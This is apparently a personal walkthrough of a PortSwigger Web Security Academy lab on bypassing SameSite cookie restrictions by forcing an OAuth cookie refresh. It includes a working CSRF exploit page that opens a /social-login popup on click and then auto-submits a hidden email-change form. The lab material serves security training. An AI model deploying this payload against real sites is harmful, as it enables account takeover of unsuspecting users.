https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter



1) perform the login as wiener:peter
    we can see that oauth is used and when we try to access a second time to /social-login the oauth server sets a valid new session cookie

    here we have noticed that SameSite is not specified so by default in chrome it is LAX, so we need to perform a top-level navigation to have a csrf


    Another thing we noticed is that the authentication is done with OAUTH and if we trigger a GET to /social-login the oauth is automatically performed and the session cookie is refreshed with a new one


2) try to change the email of wiener and notice that
    This form is used to perform the email changing
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>



3) So what we can do is to force the victim to refresh the session cookie and then after 5 seconds to change the email address creating a top-level navigation to the email changing 

    So use this fragment of html:


<html>
    <body>
        <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
            <input type="hidden" name="email" value="pwned@portswigger.net">
        </form>
        
        <p>Click anywhere on the page</p>
        <script>
            window.onclick = () => {
                window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
                setTimeout(changeEmail, 5000);
            }

            function changeEmail() {
                document.forms[0].submit();
            }
        </script>
        
    </body>

</html>


the user must click on the page to open the popup because we cannot open the popup directly (disallowed by the browsers)

